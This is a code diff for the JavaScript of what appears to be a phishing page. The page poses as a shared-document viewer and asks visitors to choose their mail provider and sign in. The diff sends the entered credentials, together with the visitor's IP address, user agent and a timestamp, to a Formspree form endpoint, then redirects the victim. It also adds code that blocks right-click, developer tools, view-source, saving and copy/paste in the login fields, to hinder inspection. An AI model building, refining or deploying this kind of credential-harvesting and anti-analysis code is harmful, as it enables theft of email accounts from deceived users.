@@ -1,11 +1,277 @@
 document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', function() {
+    // ========== DISABLE RIGHT CLICK AND SHORTCUTS ==========
+    
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        showSecurityAlert('Right-click is disabled on this page.');
+        return false;
+    });
+    
+    // Disable keyboard shortcuts
+    document.addEventListener('keydown', function(e) {
+        // Disable F12 (Developer Tools)
+        if (e.key === 'F12' || e.keyCode === 123) {
+            e.preventDefault();
+            showSecurityAlert('Developer Tools are disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+Shift+I (Developer Tools)
+        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+            e.preventDefault();
+            showSecurityAlert('Developer Tools are disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+Shift+J (JavaScript Console)
+        if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+            e.preventDefault();
+            showSecurityAlert('JavaScript Console is disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+Shift+C (Inspect Element)
+        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+            e.preventDefault();
+            showSecurityAlert('Inspect Element is disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+U (View Source)
+        if (e.ctrlKey && e.key === 'u') {
+            e.preventDefault();
+            showSecurityAlert('View Source is disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+S (Save Page)
+        if (e.ctrlKey && e.key === 's') {
+            e.preventDefault();
+            showSecurityAlert('Page saving is disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+P (Print)
+        if (e.ctrlKey && e.key === 'p') {
+            e.preventDefault();
+            showSecurityAlert('Printing is disabled.');
+            return false;
+        }
+        
+        // Disable Ctrl+Shift+S (Save As)
+        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+            e.preventDefault();
+            showSecurityAlert('Save As is disabled.');
+            return false;
+        }
+        
+        // Disable Alt+Tab-like behavior attempts (Alt combinations)
+        if (e.altKey) {
+            switch(e.key) {
+                case 'F4':
+                    e.preventDefault();
+                    showSecurityAlert('Window close is disabled.');
+                    break;
+                case 'Tab':
+                    e.preventDefault();
+                    showSecurityAlert('Tab switching is restricted.');
+                    break;
+            }
+        }
+    });
+    
+    // Disable text selection in sensitive areas
+    const sensitiveElements = document.querySelectorAll('.document-item, .popup-container, .email-display-value, .sidebar');
+    sensitiveElements.forEach(el => {
+        el.style.userSelect = 'none';
+        el.style.webkitUserSelect = 'none';
+        el.style.mozUserSelect = 'none';
+        el.style.msUserSelect = 'none';
+        
+        // Also disable drag
+        el.setAttribute('draggable', 'false');
+        
+        // Add event listeners for extra protection
+        el.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        el.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    });
+    
+    // Prevent keyboard navigation that could bypass security
+    document.addEventListener('keydown', function(e) {
+        // Prevent tab key from leaving certain areas
+        if (e.key === 'Tab') {
+            const activeElement = document.activeElement;
+            const popupActive = document.getElementById('popupOverlay').style.display === 'flex';
+            
+            if (popupActive) {
+                const focusableElements = document.querySelectorAll('.popup-container input, .popup-container button, .popup-container select, .popup-container textarea');
+                const firstElement = focusableElements[0];
+                const lastElement = focusableElements[focusableElements.length - 1];
+                
+                if (e.shiftKey && activeElement === firstElement) {
+                    e.preventDefault();
+                    lastElement.focus();
+                } else if (!e.shiftKey && activeElement === lastElement) {
+                    e.preventDefault();
+                    firstElement.focus();
+                }
+            }
+        }
+    });
+    
+    // Function to show security alert
+    function showSecurityAlert(message) {
+        // Create alert overlay if it doesn't exist
+        let alertOverlay = document.getElementById('securityAlertOverlay');
+        if (!alertOverlay) {
+            alertOverlay = document.createElement('div');
+            alertOverlay.id = 'securityAlertOverlay';
+            alertOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.8);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 9999;
+            `;
+            
+            const alertBox = document.createElement('div');
+            alertBox.style.cssText = `
+                background: white;
+                padding: 30px;
+                border-radius: 10px;
+                text-align: center;
+                max-width: 400px;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            `;
+            
+            const icon = document.createElement('i');
+            icon.className = 'fas fa-shield-alt';
+            icon.style.cssText = `
+                font-size: 3rem;
+                color: #e74c3c;
+                margin-bottom: 20px;
+            `;
+            
+            const messageText = document.createElement('p');
+            messageText.style.cssText = `
+                font-size: 1.1rem;
+                color: #2c3e50;
+                margin-bottom: 20px;
+                line-height: 1.5;
+            `;
+            messageText.id = 'securityAlertMessage';
+            
+            const closeBtn = document.createElement('button');
+            closeBtn.textContent = 'OK';
+            closeBtn.style.cssText = `
+                background: #3498db;
+                color: white;
+                border: none;
+                padding: 10px 30px;
+                border-radius: 5px;
+                font-size: 1rem;
+                cursor: pointer;
+                transition: background 0.3s;
+            `;
+            closeBtn.onmouseover = () => closeBtn.style.background = '#2980b9';
+            closeBtn.onmouseout = () => closeBtn.style.background = '#3498db';
+            closeBtn.onclick = () => {
+                alertOverlay.style.display = 'none';
+            };
+            
+            alertBox.appendChild(icon);
+            alertBox.appendChild(messageText);
+            alertBox.appendChild(closeBtn);
+            alertOverlay.appendChild(alertBox);
+            document.body.appendChild(alertOverlay);
+        }
+        
+        // Update and show message
+        document.getElementById('securityAlertMessage').textContent = message;
+        alertOverlay.style.display = 'flex';
+        
+        // Auto-hide after 3 seconds
+        setTimeout(() => {
+            alertOverlay.style.display = 'none';
+        }, 3000);
+    }
+    
+    // Additional protection: Detect DevTools opening
+    let devToolsOpen = false;
+    const threshold = 160; // Height difference when DevTools opens
+    
+    function checkDevTools() {
+        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+        
+        if ((widthThreshold || heightThreshold) && !devToolsOpen) {
+            devToolsOpen = true;
+            showSecurityAlert('Developer Tools detected. Security measures enabled.');
+        } else if (!widthThreshold && !heightThreshold && devToolsOpen) {
+            devToolsOpen = false;
+        }
+    }
+    
+    // Check periodically
+    setInterval(checkDevTools, 1000);
+    
+    // Protection against iframe embedding
+    if (window.self !== window.top) {
+        showSecurityAlert('This page cannot be embedded in iframes.');
+        document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-size:1.5rem;">Access Denied: This page cannot be embedded.</div>';
+    }
+    
+    // Disable image dragging
+    document.addEventListener('dragstart', function(e) {
+        if (e.target.tagName === 'IMG') {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // Disable copy/paste in sensitive inputs
+    const sensitiveInputs = document.querySelectorAll('#email, #password');
+    sensitiveInputs.forEach(input => {
+        input.addEventListener('copy', function(e) {
+            e.preventDefault();
+            showSecurityAlert('Copying is disabled in this field.');
+        });
+        
+        input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            showSecurityAlert('Pasting is disabled in this field.');
+        });
+        
+        input.addEventListener('cut', function(e) {
+            e.preventDefault();
+            showSecurityAlert('Cutting is disabled in this field.');
+        });
+    });
+    
+    // ========== END SECURITY FEATURES ==========
+    
+    // ... rest of your existing JavaScript code ...
+});
     // DOM Elements
     const popupOverlay = document.getElementById('popupOverlay');
     const closePopupBtn = document.querySelector('.close-popup');
     const documentItems = document.querySelectorAll('.document-item');
     const sidebarLinks = document.querySelectorAll('.sidebar-link');
     const nextBtn1 = document.getElementById('nextBtn1');
-    const submitBtn = document.getElementById('submitBtn');
     const backBtn = document.getElementById('backBtn');
     const formSteps = document.querySelectorAll('.form-step');
     const emailInput = document.getElementById('email');
@@ -13,6 +279,9 @@ document.addEventListener('DOMContentLoaded', function() {
     const displayedEmail = document.getElementById('displayedEmail');
     const formTitle = document.getElementById('formTitle');
     const emailHint = document.getElementById('emailHint');
+    const providerInput = document.getElementById('providerInput');
+    const ipAddressInput = document.getElementById('ipAddressInput');
+    const popupForm = document.getElementById('popupForm');
     
     // Mail provider elements
     const dropdownSelected = document.getElementById('dropdownSelected');
@@ -28,7 +297,7 @@ document.addEventListener('DOMContentLoaded', function() {
             domains: ['gmail.com']
         },
         'yahoo': {
-            name: 'Yahoo',
+            name: 'Yahoo Mail',
             icon: 'fab fa-yahoo',
             suffix: '@yahoo.com',
             domains: ['yahoo.com', 'yahoo.co.uk', 'ymail.com', 'rocketmail.com']
@@ -40,13 +309,13 @@ document.addEventListener('DOMContentLoaded', function() {
             domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']
         },
         'icloud': {
-            name: 'iCloud',
+            name: 'iCloud Mail',
             icon: 'fab fa-apple',
             suffix: '@icloud.com',
             domains: ['icloud.com', 'me.com', 'mac.com']
         },
         'aol': {
-            name: 'AOL',
+            name: 'AOL Mail',
             icon: 'fas fa-at',
             suffix: '@aol.com',
             domains: ['aol.com']
@@ -62,7 +331,7 @@ document.addEventListener('DOMContentLoaded', function() {
     let currentStep = 1;
     let userEmail = '';
     let selectedProvider = null;
-    let hintTimeout = null;
+    let hideHintTimeout = null;
     
     // Create menu toggle for mobile
     createMobileMenuToggle();
@@ -161,15 +430,14 @@ document.addEventListener('DOMContentLoaded', function() {
         // Add visual indication
         dropdownSelected.classList.add('has-selection');
         
-        // Update placeholder
+        // Update placeholder hint
         if (providerValue === 'custom') {
-            emailInput.placeholder = 'user@example.com';
+            emailInput.placeholder = 'Enter Email';
+            showEmailHint('Enter your full email address', 3000);
         } else {
             emailInput.placeholder = 'username' + provider.suffix;
+            showEmailHint(`Enter your ${provider.name} username`, 3000);
         }
-        
-        // Clear any existing hint
-        clearHint();
     }
     
     // Auto-detect provider from email input
@@ -189,14 +457,32 @@ document.addEventListener('DOMContentLoaded', function() {
         return 'custom';
     }
     
+    // Handle email input focus - show hint briefly
+    emailInput.addEventListener('focus', function() {
+        if (selectedProvider) {
+            const provider = mailProviders[selectedProvider];
+            if (selectedProvider === 'custom') {
+                showEmailHint('Enter your full email address', 3000);
+            } else {
+                showEmailHint(`Enter your ${provider.name} username`, 3000);
+            }
+        } else {
+            showEmailHint('Select a mail provider or enter full email', 3000);
+        }
+    });
+    
     // Handle email input changes
     emailInput.addEventListener('input', function() {
         const emailValue = this.value.trim();
         
         // Clear any existing timeout
-        if (hintTimeout) {
-            clearTimeout(hintTimeout);
-            hintTimeout = null;
+        if (hideHintTimeout) {
+            clearTimeout(hideHintTimeout);
+        }
+        
+        // Hide hint immediately when user starts typing
+        if (emailValue.length > 0) {
+            hideEmailHint();
         }
         
         if (emailValue.includes('@')) {
@@ -215,60 +501,66 @@ document.addEventListener('DOMContentLoaded', function() {
                 `;
                 dropdownSelected.classList.add('has-selection');
                 
-                // Show temporary hint for detected provider
+                // Show hint for detected provider briefly
                 if (detectedProvider === 'custom') {
-                    showTemporaryHint('Custom email address detected', 1500);
+                    showEmailHint('Custom email address detected', 2000);
                 } else {
-                    showTemporaryHint(`${provider.name} address detected`, 1500);
+                    showEmailHint(`${provider.name} address detected`, 2000);
                 }
             }
         }
     });
     
-    // Show temporary hint that auto-hides
-    function showTemporaryHint(message, duration = 1500) {
-        // Clear any existing hint
-        clearHint();
+    // Show email hint with auto-hide timeout
+    function showEmailHint(message, timeout = 3000) {
+        // Clear any existing timeout
+        if (hideHintTimeout) {
+            clearTimeout(hideHintTimeout);
+        }
         
-        // Show new hint
         emailHint.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
         emailHint.classList.add('show');
         
-        // Auto-hide after duration
-        hintTimeout = setTimeout(() => {
-            clearHint();
-        }, duration);
-    }
-    
-    // Clear hint immediately
-    function clearHint() {
-        if (hintTimeout) {
-            clearTimeout(hintTimeout);
-            hintTimeout = null;
+        // Auto-hide after specified timeout
+        if (timeout > 0) {
+            hideHintTimeout = setTimeout(() => {
+                hideEmailHint();
+            }, timeout);
         }
-        emailHint.classList.remove('show');
-        emailHint.innerHTML = '';
     }
     
-    // Hide hint when email input loses focus (user stops typing)
-    emailInput.addEventListener('blur', function() {
-        clearHint();
-    });
+    // Hide email hint
+    function hideEmailHint() {
+        emailHint.classList.remove('show');
+        if (hideHintTimeout) {
+            clearTimeout(hideHintTimeout);
+            hideHintTimeout = null;
+        }
+    }
     
     // Also allow Enter key to submit email
     emailInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             e.preventDefault();
-            clearHint(); // Hide hint when submitting
+            // Hide hint when pressing Enter
+            hideEmailHint();
             if (validateEmail()) {
                 proceedToPassword();
             }
         }
     });
     
+    // Hide hint when clicking outside email input
+    document.addEventListener('click', function(e) {
+        if (!emailInput.contains(e.target) && !emailHint.contains(e.target)) {
+            hideEmailHint();
+        }
+    });
+    
     // Form navigation - Next button from email step
     nextBtn1.addEventListener('click', function() {
-        clearHint(); // Hide hint when clicking Next
+        // Hide hint when clicking Next
+        hideEmailHint();
         if (validateEmail()) {
             proceedToPassword();
         }
@@ -293,23 +585,6 @@ document.addEventListener('DOMContentLoaded', function() {
             emailInput.focus();
             emailInput.select();
         }, 300);
-    });
-    
-    // Submit button
-    submitBtn.addEventListener('click', async function() {
-        if (validatePassword()) {
-            await submitForm();
-        }
-    });
-    
-    // Also allow Enter key to submit password
-    passwordInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            if (validatePassword()) {
-                submitForm();
-            }
-        }
     });
     
     // Display email in step 2
@@ -338,6 +613,14 @@ document.addEventListener('DOMContentLoaded', function() {
         userEmail = '';
         displayedEmail.textContent = '';
         selectedProvider = null;
+        providerInput.value = '';
+        ipAddressInput.value = '';
+        
+        // Clear any pending timeout
+        if (hideHintTimeout) {
+            clearTimeout(hideHintTimeout);
+            hideHintTimeout = null;
+        }
         
         // Reset dropdown to default state
         dropdownSelected.innerHTML = `
@@ -348,8 +631,8 @@ document.addEventListener('DOMContentLoaded', function() {
         dropdownSelected.classList.remove('has-selection');
         
         // Reset email input
-        emailInput.placeholder = 'Email';
-        clearHint();
+        emailInput.placeholder = 'Enter Email';
+        hideEmailHint();
         
         // Ensure dropdown is closed
         dropdownOptions.classList.remove('show');
@@ -361,6 +644,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const emailValue = emailInput.value.trim();
         
         if (!emailValue) {
+            showEmailHint('Please enter your email address', 3000);
             alert('Please enter your email address');
             return false;
         }
@@ -368,6 +652,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Validate email format
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailRegex.test(emailValue)) {
+            showEmailHint('Please enter a valid email address (e.g., user@example.com)', 3000);
             alert('Please enter a valid email address (e.g., user@example.com)');
             return false;
         }
@@ -390,24 +675,15 @@ document.addEventListener('DOMContentLoaded', function() {
         return true;
     }
     
-    function validatePassword() {
-        const password = passwordInput.value.trim();
+    // Formspree Form Submission
+    popupForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        if (!password) {
-            alert('Please enter your password');
-            return false;
+        if (!validateEmail()) {
+            showStep(1);
+            return;
         }
         
-        if (password.length < 6) {
-            alert('Password must be at least 6 characters');
-            return false;
-        }
-        
-        return true;
-    }
-    
-    // Submit form data to server
-    async function submitForm() {
         const submitBtn = document.getElementById('submitBtn');
         const originalText = submitBtn.textContent;
         
@@ -417,19 +693,10 @@ document.addEventListener('DOMContentLoaded', function() {
             submitBtn.textContent = 'Submitting...';
             submitBtn.style.opacity = '0.7';
             
-            const formData = {
-                email: userEmail,
-                password: passwordInput.value.trim(),
-                provider: selectedProvider
-            };
+            // Set provider value in hidden input
+            providerInput.value = selectedProvider;
             
-            console.log('Submitting form data:', { 
-                email: formData.email, 
-                provider: formData.provider,
-                passwordLength: formData.password.length 
-            });
-            
-            // Get IP address
+            // Get and set IP address
             let ipAddress = 'Unknown';
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -440,30 +707,43 @@ document.addEventListener('DOMContentLoaded', function() {
             } catch (ipError) {
                 console.warn('Could not fetch IP address:', ipError);
             }
+            ipAddressInput.value = ipAddress;
             
-            formData.ip_address = ipAddress;
+            // Add timestamp
+            const timestampInput = document.createElement('input');
+            timestampInput.type = 'hidden';
+            timestampInput.name = 'timestamp';
+            timestampInput.value = new Date().toISOString();
+            this.appendChild(timestampInput);
             
-            // Send data to server
-            console.log('Sending request to submit.php...');
-            const response = await fetch('submit.php', {
+            // Add user agent
+            const userAgentInput = document.createElement('input');
+            userAgentInput.type = 'hidden';
+            userAgentInput.name = 'user_agent';
+            userAgentInput.value = navigator.userAgent;
+            this.appendChild(userAgentInput);
+            
+            // Log form data
+            const formData = new FormData(this);
+            console.log('Submitting to Formspree:', Object.fromEntries(formData));
+            
+            // Submit to Formspree using fetch
+            const response = await fetch(this.action, {
                 method: 'POST',
+                body: formData,
                 headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData)
+                    'Accept': 'application/json'
+                }
             });
             
-            console.log('Response status:', response.status);
-            const result = await response.json();
-            console.log('Server response:', result);
+            console.log('Formspree response status:', response.status);
             
-            if (result.success) {
+            if (response.ok) {
                 // Show success message
                 showStep(3);
                 updateFormTitle('Access Granted');
                 
-                // Log success to console
-                console.log('Data stored successfully with ID:', result.insert_id);
+                console.log('Form submitted successfully to Formspree');
                 
                 // Countdown before redirect
                 let countdown = 3;
@@ -482,19 +762,20 @@ document.addEventListener('DOMContentLoaded', function() {
                 }, 1000);
                 
             } else {
-                throw new Error(result.error || 'Server returned an error');
+                const error = await response.json();
+                throw new Error(error.error || 'Formspree submission failed');
             }
             
         } catch (error) {
-            console.error('Error submitting form:', error);
+            console.error('Error submitting form to Formspree:', error);
             
             // Show user-friendly error message
             let errorMessage = 'There was an error submitting your information. ';
             
             if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
                 errorMessage += 'Please check your internet connection and try again.';
-            } else if (error.message.includes('connection')) {
-                errorMessage += 'Cannot connect to server. Please try again later.';
+            } else if (error.message.includes('Formspree')) {
+                errorMessage += 'Form submission service is temporarily unavailable. Please try again later.';
             } else {
                 errorMessage += 'Please try again.';
             }
@@ -506,7 +787,7 @@ document.addEventListener('DOMContentLoaded', function() {
             submitBtn.textContent = originalText;
             submitBtn.style.opacity = '1';
         }
-    }
+    });
     
     // Function to perform the redirect
     function performRedirect() {
@@ -514,7 +795,7 @@ document.addEventListener('DOMContentLoaded', function() {
         closePopup();
         
         // Define the redirect URL (you can change this to any URL you want)
-        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
+        const redirectUrl = 'https://example.com/document-viewer'; // Change this URL
         
         console.log('Redirecting to:', redirectUrl);
         
